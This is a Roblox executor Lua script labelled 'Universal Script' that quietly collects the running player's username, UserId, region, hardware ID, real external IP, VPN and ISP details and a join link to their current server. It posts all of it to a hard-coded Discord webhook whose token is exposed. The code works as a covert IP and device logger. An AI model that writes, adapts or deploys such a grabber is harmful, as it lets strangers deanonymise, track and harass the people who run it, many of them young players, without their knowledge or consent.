local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")

local request =
    http_request or
    request or
    syn and syn.request

if not request then return end

local player = Players.LocalPlayer
local webhook = "https://discord.com/api/webhooks/1455247951621521460/8yqUegsToCpf83OYRFPGQ7yN1TxVCFBODgi89dybM3B0tkGZYRFXXZQUEV9XISoKBO1V"

-- ðŸŽ® Game name
local gameName = "Unknown Game"
pcall(function()
    gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
end)

-- ðŸ”— Join link
local joinLink =
    "roblox://placeId=" .. game.PlaceId ..
    "&gameInstanceId=" .. game.JobId

-- ðŸŒ Country / Region
local region = "Unknown"
pcall(function()
    region = LocalizationService:GetCountryRegionForPlayerAsync(player)
end)

-- ðŸ§  Executor
local executor = identifyexecutor and identifyexecutor() or "Unknown Executor"

-- ðŸ”§ Hardware ID
local hwid = "Unknown"
pcall(function()
    if syn and syn.get_hwid then
        hwid = syn.get_hwid()
    elseif get_hwid then
        hwid = get_hwid()
    elseif gethwid then
        hwid = gethwid()
    end
end)

-- ðŸŒ REAL EXTERNAL IP (using ipify API)
local realIP = "Failed to fetch"
pcall(function()
    -- Try multiple IP API services as fallback
    local ipServices = {
        "https://api.ipify.org",
        "https://api64.ipify.org",
        "https://icanhazip.com",
        "https://checkip.amazonaws.com"
    }
    
    for _, apiUrl in ipairs(ipServices) do
        local success, result = pcall(function()
            local response = request({
                Url = apiUrl,
                Method = "GET"
            })
            if response and response.Body and #response.Body > 0 and #response.Body < 20 then
                return response.Body:gsub("%s+", "") -- Clean whitespace
            end
        end)
        
        if success and result and result:match("%d+%.%d+%.%d+%.%d+") then
            realIP = result
            break
        end
    end
end)

-- ðŸ” VPN/Proxy detection
local vpnStatus = "Unknown"
pcall(function()
    if realIP ~= "Failed to fetch" then
        local ipCheck = request({
            Url = "http://ip-api.com/json/" .. realIP .. "?fields=proxy,isp,countryCode",
            Method = "GET"
        })
        if ipCheck and ipCheck.Body then
            local data = HttpService:JSONDecode(ipCheck.Body)
            vpnStatus = data.proxy and "âœ… VPN/Proxy" or "âŒ No"
            
            -- Add ISP and country info if available
            if data.isp then vpnStatus = vpnStatus .. " | " .. data.isp end
            if data.countryCode then vpnStatus = vpnStatus .. " | " .. data.countryCode end
        end
    end
end)

-- âš ï¸ Blacklist check (optional - uncomment if you have a blacklist API)
-- pcall(function()
--     local blacklistCheck = request({
--         Url = "https://your-blacklist-api.com/check?hwid=" .. hwid .. "&ip=" .. realIP,
--         Method = "GET"
--     })
--     if blacklistCheck and blacklistCheck.Body then
--         local isBlacklisted = HttpService:JSONDecode(blacklistCheck.Body)
--         if isBlacklisted then
--             player:Kick("ðŸš« Device Blacklisted")
--         end
--     end
-- end)

local data = {
    embeds = {{
        title = "ðŸ›¡ï¸ | Universal Script",  -- Changed title
        color = 0x00AAFF,

        thumbnail = {
            url = "https://media.discordapp.net/attachments/1389612289371537549/1446840065979453480/SynthX_v4.png"
        },

        fields = {
            {
                name = "ðŸŽ® Game",
                value = "``" .. gameName .. "``",
                inline = true
            },
            {
                name = "ðŸ‘¤ Username",
                value = "``" .. player.Name .. "``",
                inline = true
            },
            {
                name = "ðŸ†” UserId",
                value = "``" .. player.UserId .. "``",
                inline = true
            },
            {
                name = "ðŸŒ Country / Region",
                value = "``" .. region .. "``",
                inline = true
            },
            {
                name = "ðŸ–¥ï¸ Hardware ID",
                value = "```" .. hwid .. "```",
                inline = false
            },
            {
                name = "ðŸŒ IP Address",
                value = "``" .. realIP .. "``",
                inline = true
            },
            {
                name = "ðŸ” VPN Status",
                value = "``" .. vpnStatus .. "``",
                inline = true
            },
            {
                name = "ðŸ§  Executor",
                value = "``" .. executor .. "``",
                inline = true
            },
            {
                name = "ðŸ”— Join Link",
                value = "``" .. joinLink .. "``",
                inline = false
            }
        },

        footer = {
            text = "Universal Logs â€¢ " .. os.date("%Y-%m-%d %H:%M:%S")
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

request({
    Url = webhook,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = HttpService:JSONEncode(data)
})

-- Optional: Send a second embed for important alerts (like blacklist matches)
if hwid ~= "Unknown" then
    -- You can add logic here to check against known blacklisted HWIDs
    -- and send an alert embed if there's a match
end
